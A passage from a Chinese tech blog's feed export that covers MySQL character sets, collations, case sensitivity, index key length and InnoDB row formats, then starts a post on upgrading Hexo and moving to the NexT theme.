class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME COLLATE utf8_general_ci &#x3D; &#39;MYSQL&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| SCHEMA_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><ol start="2"><li>使用UPPER或LOWER</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE UPPER(SCHEMA_NAME) &#x3D; &#39;MYSQL&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| SCHEMA_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p>查询INFORMATION_SCHEMA中搜索自身时，将匹配<code>utf8_general_ci</code>规则。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SCHEMA_NAME</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA <span class="keyword">WHERE</span> <span class="built_in">SCHEMA_NAME</span> = <span class="string">'INFORMATION_SCHEMA'</span>;</span><br></pre></td></tr></table></figure><h2 id="binary相关"><a href="#binary相关" class="headerlink" title="binary相关"></a>binary相关</h2><p><strong>binary不同于_bin</strong></p><p><strong>LOWER() 和 UPPER() 对于二进制字符串是无效的(包括 BINARY, VARBINARY, BLOB)</strong><br><code>SELECT LOWER(&#39;aA&#39;), UPPER(&#39;zZ&#39;);</code><br>不适用于<br><code>SET NAMES binary;</code><br>必须将字符串转换为非二进制字符串<br><code>SELECT LOWER(&#39;aA&#39;), LOWER(CONVERT(&#39;aA&#39; USING latin1));</code></p><p>binary 可将 string 转换为二进制 string。BINARY str 其实是 CAST(str AS BINARY) 的缩写。<br>所以，对于CHAR、VARCHAR和TEXT类型，BINARY属性可以为列分配该列字符集的 校对规则。即<br><strong>如默认不区分大小写，可添加binary，强制进行按字节进行比较,以区分大小写。</strong> <code>如建表时未添加binary属性，可能影响索引失效</code><br>这是我们通常在暂无能为力更改现有结构下的常规做法。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> some_table <span class="keyword">where</span> <span class="built_in">binary</span> <span class="keyword">str</span>=<span class="string">'abc'</span>;</span><br></pre></td></tr></table></figure><p>我们可在建表建字段时，可在区分大小写的字段上添加binary属性。</p><p>对于二进制字符串，所有字符在比较中都很重要，包括尾随空格。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES binary;</span><br><span class="line">SELECT <span class="emphasis">'a '</span> = <span class="emphasis">'a'</span>;</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">| <span class="emphasis">'a '</span> = <span class="emphasis">'a'</span> |</span><br><span class="line"><span class="code">+------------+</span></span><br><span class="line">|          0 |</span><br><span class="line"><span class="code">+------------+</span></span><br></pre></td></tr></table></figure><p>因为binary会按字节，区分大小写，结尾使用<code>\0</code>填充到全部位数。<br>搜索时也是使用全部匹配，填充<code>\0</code>到位</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE t1 (</span><br><span class="line"><span class="code">         a CHAR(10) CHARACTER SET utf8 COLLATE utf8_bin,</span></span><br><span class="line"><span class="code">         b BINARY(10)</span></span><br><span class="line"><span class="code">       );</span></span><br><span class="line">INSERT INTO t1 VALUES (<span class="emphasis">'a'</span>,<span class="emphasis">'a'</span>);</span><br><span class="line">SELECT HEX(a), HEX(b),b = <span class="emphasis">'a'</span>,b = <span class="emphasis">'a\0\0\0\0\0\0\0\0\0'</span> FROM t1;</span><br><span class="line"><span class="code">+--------+</span>----------------------<span class="code">+---------+</span>---------------------------+</span><br><span class="line">| HEX(a) | HEX(b)               | b = <span class="emphasis">'a'</span> | b = <span class="emphasis">'a\0\0\0\0\0\0\0\0\0'</span> |</span><br><span class="line"><span class="code">+--------+</span>----------------------<span class="code">+---------+</span>---------------------------+</span><br><span class="line">| 61     | 61000000000000000000 |       0 |                         1 |</span><br><span class="line"><span class="code">+--------+</span>----------------------<span class="code">+---------+</span>---------------------------+</span><br></pre></td></tr></table></figure><p>b 已不等于’a’<br>所以，有时候, 如果将索引列转换为 BINARY, MySQL可能不会使用索引。</p><p>varbinary保存变长的字符串，后面不会补\0</p><h2 id="查看服务器正使用的连接的字符集和排序规则"><a href="#查看服务器正使用的连接的字符集和排序规则" class="headerlink" title="查看服务器正使用的连接的字符集和排序规则"></a>查看服务器正使用的连接的字符集和排序规则</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'character_set%'</span>;</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'collation%'</span>;</span><br></pre></td></tr></table></figure><h3 id="MySQL字符集系统变量名简述"><a href="#MySQL字符集系统变量名简述" class="headerlink" title="MySQL字符集系统变量名简述"></a>MySQL字符集系统变量名简述</h3><table><thead><tr><th align="left">系统变量名</th><th align="left">简述</th></tr></thead><tbody><tr><td align="left">character_set_system</td><td align="left">元数据Metadata使用，即USER(), CURRENT_USER(), SESSION_USER(), SYSTEM_USER(), DATABASE(), and VERSION() 等functions</td></tr><tr><td align="left">character_set_server、collation_server</td><td align="left">服务器对应的内部操作使用</td></tr><tr><td align="left">character_set_database、collation_database</td><td align="left">当前选中数据库的默认</td></tr><tr><td align="left">character_set_client</td><td align="left">客户端来源数据</td></tr><tr><td align="left">character_set_connection、collation_connection</td><td align="left">服务器在接收时</td></tr><tr><td align="left">character_set_results</td><td align="left">服务器查询结果集返回到客户端</td></tr></tbody></table><p>另外，<a href="#查询字符串时，显示指定字符集">查询时指定字符集</a></p><h2 id="SET-NAMES-utf8mb4-实际等同于"><a href="#SET-NAMES-utf8mb4-实际等同于" class="headerlink" title="SET NAMES utf8mb4 实际等同于"></a>SET NAMES utf8mb4 实际等同于</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> NAMES <span class="comment">utf8mb4</span>;</span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> character_set_client <span class="comment">= utf8mb4</span>;</span><br><span class="line"><span class="keyword">SET</span> character_set_results <span class="comment">= utf8mb4</span>;</span><br><span class="line"><span class="keyword">SET</span> character_set_connection <span class="comment">= utf8mb4</span>;</span><br></pre></td></tr></table></figure><h3 id="MySQL中的字符集转换过程"><a href="#MySQL中的字符集转换过程" class="headerlink" title="MySQL中的字符集转换过程"></a>MySQL中的字符集转换过程</h3><ol><li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</p></li><li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p><ul><li><p>使用每个数据字段的CHARACTER SET设定值；</p></li><li><p>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</p></li><li><p>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p></li><li><p>若上述值不存在，则使用character_set_server设定值。</p></li></ul></li><li><p>将操作结果从内部操作字符集转换为character_set_results。</p></li></ol><h2 id="查看指定数据库db-name的字符集和排序规则"><a href="#查看指定数据库db-name的字符集和排序规则" class="headerlink" title="查看指定数据库db_name的字符集和排序规则"></a>查看指定数据库db_name的字符集和排序规则</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA <span class="keyword">WHERE</span> <span class="built_in">SCHEMA_NAME</span> = <span class="string">'db_name'</span>;</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">USE</span> db_name;</span><br><span class="line"><span class="built_in">SELECT</span> <span class="comment">@@</span>character_set_database, <span class="comment">@@</span>collation_database;</span><br></pre></td></tr></table></figure><h2 id="查询字符串时，显示指定字符集"><a href="#查询字符串时，显示指定字符集" class="headerlink" title="查询字符串时，显示指定字符集"></a>查询字符串时，显示指定字符集</h2><p>语法：</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="name">_charset_name</span>]<span class="symbol">'string</span>' [<span class="name">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> _utf8<span class="string">'abc'</span> <span class="keyword">COLLATE</span> utf8_danish_ci;</span><br></pre></td></tr></table></figure><h2 id="创建和修改库、表、列的字符集和排序规则"><a href="#创建和修改库、表、列的字符集和排序规则" class="headerlink" title="创建和修改库、表、列的字符集和排序规则"></a>创建和修改库、表、列的字符集和排序规则</h2><h3 id="创建和修改数据库db-name时，都可指定"><a href="#创建和修改数据库db-name时，都可指定" class="headerlink" title="创建和修改数据库db_name时，都可指定"></a>创建和修改数据库db_name时，都可指定</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> db_name</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> collation_name]</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> db_name</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><h3 id="创建和修改指定表tbl-name的字符集和排序规则"><a href="#创建和修改指定表tbl-name的字符集和排序规则" class="headerlink" title="创建和修改指定表tbl_name的字符集和排序规则"></a>创建和修改指定表tbl_name的字符集和排序规则</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl_name (column_list)</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tbl_name</span><br><span class="line">    [[<span class="keyword">DEFAULT</span>] <span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><h3 id="创建和修改表指定列col-name的字符集和排序规则"><a href="#创建和修改表指定列col-name的字符集和排序规则" class="headerlink" title="创建和修改表指定列col_name的字符集和排序规则"></a>创建和修改表指定列col_name的字符集和排序规则</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">col_name &#123;<span class="type">CHAR</span> | <span class="type">VARCHAR</span> | <span class="type">TEXT</span>&#125; (col_length)</span><br><span class="line">    [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><p>also be used for ENUM and SET columns:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">col_name &#123;ENUM | <span class="keyword">SET</span>&#125; (val_list)</span><br><span class="line">    [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [<span class="keyword">COLLATE</span> collation_name]</span><br></pre></td></tr></table></figure><h3 id="修改为utf8mb4示例"><a href="#修改为utf8mb4示例" class="headerlink" title="修改为utf8mb4示例"></a>修改为utf8mb4示例</h3><p>依次修改数据库，表，表字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改数据库:</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">DATABASE</span> database_name <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4 <span class="keyword">COLLATE</span> = utf8mb4_unicode_ci;</span><br><span class="line"><span class="comment"># 修改表:</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CONVERT</span> <span class="keyword">TO</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br><span class="line"><span class="comment"># 修改表字段:</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">CHANGE</span> column_name column_name <span class="built_in">VARCHAR</span>(<span class="number">191</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_unicode_ci;</span><br></pre></td></tr></table></figure><h2 id="索引键超长"><a href="#索引键超长" class="headerlink" title="索引键超长"></a>索引键超长</h2><p>InnoDB中使用 <strong>COMPACT</strong> 或 <strong>REDUNDANT</strong> 格式的表的单个索引的最大长度为767字节，因此对于utf8mb3或utf8mb4的列，可以分别索引最多255或191个字符。<br>字段定义的是能存储的字符数，比如 VARCHAR(200) 代表能够存200个汉字，索引定义是字符集类型最大长度算的，即 utf8 maxbytes=3, utf8mb4 maxbytes=4，算下来utf8和utf8mb4两种情况的索引长度分别为600 bytes和800bytes，后者超过了768，导致出错<code>Error 1071: Specified key was too long; max key length is 767 bytes。</code> 。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col1 <span class="type">VARCHAR</span>(<span class="number">500</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8, <span class="keyword">INDEX</span> (col1(<span class="number">255</span>))</span><br><span class="line">col1 <span class="type">VARCHAR</span>(<span class="number">500</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4, <span class="keyword">INDEX</span> (col1(<span class="number">191</span>))</span><br></pre></td></tr></table></figure><ul><li>InnoDB中 <strong>COMPRESSED</strong> 或 <strong>DYNAMIC</strong> 最多3072字节，所以分别为最多1024或768个字符utf8mb3或 utf8mb4列。但也依然不建议索引太长，太浪费空间和cpu搜索资源。</li></ul><p>如果已有定义超过这个长度的，可加上前缀索引，如果暂不能加上前缀索引（像唯一索引），可把该字段的字符集改回utf8或latin1。<br>但是，（ <strong>敲黑板啦，很重要</strong> ），要防止出现 <code>Illegal mix of collations (utf8_general_ci,IMPLICIT) and (utf8mb4_general_ci,COERCIBLE) for operation &#39;=&#39;</code> 错误：连接字符集使用utf8mb4，但 SELECT/UPDATE where条件有utf8类型的列，且条件右边存在不属于utf8字符，就会触发该异常。表示踩过这个坑。</p><p>再多加一个友好提示：EXPLAIN 结果里面的 key_len 指的搜索索引长度，单位是bytes，而且是以字符集支持的单字符最大字节数算的，这也是为什么 INDEX_LENGTH 膨胀厉害的一个原因。</p><h2 id="InnoDB默认表的行格式"><a href="#InnoDB默认表的行格式" class="headerlink" title="InnoDB默认表的行格式"></a>InnoDB默认表的行格式</h2><p>在MySQL 5.0.3之前，<strong>REDUNDANT</strong> 是InnoDB唯一可用的行格式。<br>从MySQL 5.0.3到MySQL 5.7.8的默认行格式，为 <strong>compact</strong> 数据格式。<br>从MySQL 5.7.9开始，默认行格式由 <strong>innodb_default_row_format</strong> 配置选项定义， 默认设置为 <strong>DYNAMIC</strong> 。</p><p>更改系统表空间默认行格式DYNAMIC， COMPACT，和REDUNDANT。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">SET</span> GLOBAL <span class="attribute">innodb_default_row_format</span>=DYNAMIC;</span><br></pre></td></tr></table></figure><p>COMPRESSED 只能在CREATE TABLE或 ALTER TABLE时明确指定。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t2 (c1 <span class="built_in">INT</span>) ROW_FORMAT=COMPRESSED;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t1 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> (c2 <span class="built_in">INT</span>);</span><br></pre></td></tr></table></figure><p>如未指定<code>ROW_FORMAT</code>将使用<code>innodb_default_row_format</code>，也就是实际上会补充为<code>ROW_FORMAT=DEFAULT</code>。</p><p>使用<code>INFORMATION_SCHEMA.INNODB_TABLES</code>查询表信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_TABLES WHERE NAME LIKE &#39;test&#x2F;t1&#39; \G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">     TABLE_ID: 54</span><br><span class="line">         NAME: test&#x2F;t1</span><br><span class="line">         FLAG: 33</span><br><span class="line">       N_COLS: 4</span><br><span class="line">        SPACE: 35</span><br><span class="line">   ROW_FORMAT: Dynamic</span><br><span class="line">ZIP_PAGE_SIZE: 0</span><br><span class="line">   SPACE_TYPE: Single</span><br></pre></td></tr></table></figure><h3 id="查看表的行格式"><a href="#查看表的行格式" class="headerlink" title="查看表的行格式"></a>查看表的行格式</h3><p>tbl_name 表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">TABLE</span> <span class="keyword">STATUS</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'tbl_name%'</span>;</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> TABLE_NAME <span class="keyword">LIKE</span> <span class="string">'tbl_name%'</span>;</span><br></pre></td></tr></table></figure><h2 id="InnoDB最大表空间大小，表的最大大小"><a href="#InnoDB最大表空间大小，表的最大大小" class="headerlink" title="InnoDB最大表空间大小，表的最大大小"></a>InnoDB最大表空间大小，表的最大大小</h2><p><code>innodb_page_size</code>只能在初始化MySQL实例之前进行配置。默认的16KB页面大小或更大适用于各种工作负载，特别是涉及涉及批量更新的表扫描和DML操作的查询。</p><table><thead><tr><th>InnoDB页面大小</th><th>最大表空间大小</th></tr></thead><tbody><tr><td>4KB</td><td>16TB</td></tr><tr><td>8KB</td><td>32TB</td></tr><tr><td>16KB</td><td>64TB</td></tr><tr><td>32KB</td><td>128TB</td></tr><tr><td>64KB</td><td>256TB</td></tr></tbody></table><p>最大表空间大小也是表的最大大小。</p><p>MySQL客户端程序理论上连接时，默认使用<code>utf8mb4</code>。也可以直接使用<code>--default-character-set</code>指定。</p><p>参考链接:<br><a href="https://my.oschina.net/xsh1208/blog/1052781">全面了解mysql中utf8和utf8mb4的区别</a><br><a href="http://seanlook.com/2016/10/23/mysql-utf8mb4/">mysql使用utf8mb4经验吐血总结</a></p>]]></content>
    
    <summary type="html">
    
      MySQL中utf8编码最长使用3字节，在5.5.3新增的utf8mb4，才是兼容四字节的。Java的UTF-8是支持4字节的，所以不需配置mb4 。而Java驱动会自动检测服务端的character_set_server，为utf8mb4，驱动在建立连接时设置SET NAMES utf8mb4。utf8mb4_general_ci 在比较和排序的时候更快，utf8mb4_unicode_ci 更精确。
    
    </summary>
    
    
      <category term="MySQL" scheme="https://blog.yanzhe.tk/categories/mysql/"/>
    
    
      <category term="MySQL" scheme="https://blog.yanzhe.tk/tags/mysql/"/>
    
      <category term="utf8mb4" scheme="https://blog.yanzhe.tk/tags/utf8mb4/"/>
    
      <category term="MySQL字符集" scheme="https://blog.yanzhe.tk/tags/mysql%E5%AD%97%E7%AC%A6%E9%9B%86/"/>
    
      <category term="MySQL大小写" scheme="https://blog.yanzhe.tk/tags/mysql%E5%A4%A7%E5%B0%8F%E5%86%99/"/>
    
      <category term="MySQL尾部空格" scheme="https://blog.yanzhe.tk/tags/mysql%E5%B0%BE%E9%83%A8%E7%A9%BA%E6%A0%BC/"/>
    
      <category term="InnoDB default ROW_FORMAT" scheme="https://blog.yanzhe.tk/tags/innodb-default-row-format/"/>
    
  </entry>
  
  <entry>
    <title>hexo升级和切换主题到Next</title>
    <link href="https://blog.yanzhe.tk/2018/06/24/hexo-upgrade-and-change-next-theme/"/>
    <id>https://blog.yanzhe.tk/2018/06/24/hexo-upgrade-and-change-next-theme/</id>
    <published>2018-06-24T06:45:04.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<p>好久没管过hexo，今天升级hexo，切换为next主题 后，遇坑无数，记录一下。</p><a id="more"></a><p>之前一直使用的<code>hexo 2.8.3</code>，后来有台机器升级了node，这台机器上再使用hexo就有点问题。索性就都升级了。当前使用<code>hexo 3.7.1</code></p><p>遇坑如下：</p><h3 id="当hexo-g-报错-Error-expected-end-of-comment-got-end-of-file"><a href="#当hexo-g-报错-Error-expected-end-of-comment-got-end-of-file" class="headerlink" title="当hexo g 报错 Error: expected end of comment, got end of file"></a>当hexo g 报错 Error: expected end of comment, got end of file</h3><p>找找md 文件中应该是含有 {&#35; ，需要使用raw包含起来为<code>{&#35;</code>，或是使用三个<code>`</code> 符号包含起来</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep &#123;# *.md -rn</span><br><span class="line"># 即 &#123;#需要改为 &#123;% raw %&#125;&#123;#&#123;% endraw %&#125; &#123;&#123; <span class="string">'&#123;#'</span> &#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="当hexo-g-报错-mozjpeg-vendor-cjpeg-ENOENT-等"><a href="#当hexo-g-报错-mozjpeg-vendor-cjpeg-ENOENT-等" class="headerlink" title="当hexo g 报错 mozjpeg/vendor/cjpeg ENOENT 等"></a>当hexo g 报错 mozjpeg/vendor/cjpeg ENOENT 等</h3><p>缺少包安装啥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install autoconf libtool nasm wget automake gcc</span><br><span class="line"><span class="meta">#</span><span class="bash">或</span></span><br><span class="line">yum install wget autoconf automake gcc nasm libtool</span><br></pre></td></tr></table></figure><p>然后，执行rebuild</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm rebuild mozjpeg  </span><br><span class="line">npm rebuild gifsicle  </span><br><span class="line">npm rebuild optipng-bin</span><br><span class="line">npm rebuild jpegtran-bin</span><br></pre></td></tr></table></figure><p>当然也是可以使用 cnpm</p><p><a href="https://hexo.io/zh-cn/docs/troubleshooting.html">hexo问题解答</a></p><h3 id="使用Gitment-替代多说"><a href="#使用Gitment-替代多说" class="headerlink" title="使用Gitment 替代多说"></a>使用Gitment 替代多说</h3><p>使用 GitHub Issues 搭建评论系统<span class="inline-yellow"><a href="https://imsun.net/posts/gitment-introduction/">Gitment</a></span></p><p>在next中只需要注册，并填写参数就行了<br>注册一个<a href="https://github.com/settings/applications/new">OAuth</a></p><p>将client_id 和 client_secret记下，新开一个专门存储评论的仓库，填入github_repo，填入对应自己github_user</p><h3 id="使用next有点小问题"><a href="#使用next有点小问题" class="headerlink" title="使用next有点小问题"></a>使用next有点小问题</h3><p>下载时没注意，直接git clone了next，也就是最新版。有点小问题，侧边栏失效。<br>比较v5.1.2 ，修改了<code>next/layout/_partials/header.swig</code> 为如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for name, path in theme.menu %&#125;</span><br><span class="line">        &#123;% set itemName = name.toLowerCase() %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-&#123;&#123; itemName | replace(' ', '-') &#125;&#125;"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for(name.split('||')[0]) | trim &#125;&#125;"</span> <span class="attr">rel</span>=<span class="string">"section"</span>&gt;</span></span><br><span class="line">            &#123;% if theme.menu_icons.enable %&#125;</span><br><span class="line">              <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"menu-item-icon fa fa-fw fa-&#123;&#123; path.split('||')[1] | trim | default('question-circle') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">            &#123;&#123; __('menu.' + name) | replace('menu.', '') &#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      &#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>(实际上只是将原有<code>url_for(path.split(&#39;||&#39;)[0])</code> 改为了<code>url_for(name.split(&#39;||&#39;)[0])</code>)</p><h3 id="推翻上述说法，使用theme-next-hexo-theme-next中的新版"><a href="#推翻上述说法，使用theme-next-hexo-theme-next中的新版" class="headerlink" title="推翻上述说法，使用theme-next/hexo-theme-next中的新版"></a>推翻上述说法，使用theme-next/hexo-theme-next中的新版</h3><p>记录到一半发现next 最新版迁移了。先切换到最新版再看看</p><p>next 5.x 到 6.x 变化蛮大</p><p>从<span class="inline-yellow"><a href="https://github.com/iissnan/hexo-theme-next">iissnan/hexo-theme-next</a></span> 到了<span class="inline-yellow"><a href="https://github.com/theme-next/hexo-theme-next">theme-next/hexo-theme-next</a></span></p><h2 id="记录以下升级步骤"><a href="#记录以下升级步骤" class="headerlink" title="记录以下升级步骤"></a>记录以下升级步骤</h2><p>关于升级第一点，没事别手贱升级！！！</p><h3 id="nvm-升级-nodejs"><a href="#nvm-升级-nodejs" class="headerlink" title="nvm 升级 nodejs"></a>nvm 升级 nodejs</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git and source nvm</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/creationix/nvm ~/.nvm</span><br><span class="line">source ~/.nvm/nvm.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># install latest nodejs version, and</span></span><br><span class="line"><span class="comment"># set default node version to be used in new shell</span></span><br><span class="line">nvm install <span class="keyword">node</span><span class="title"></span></span><br><span 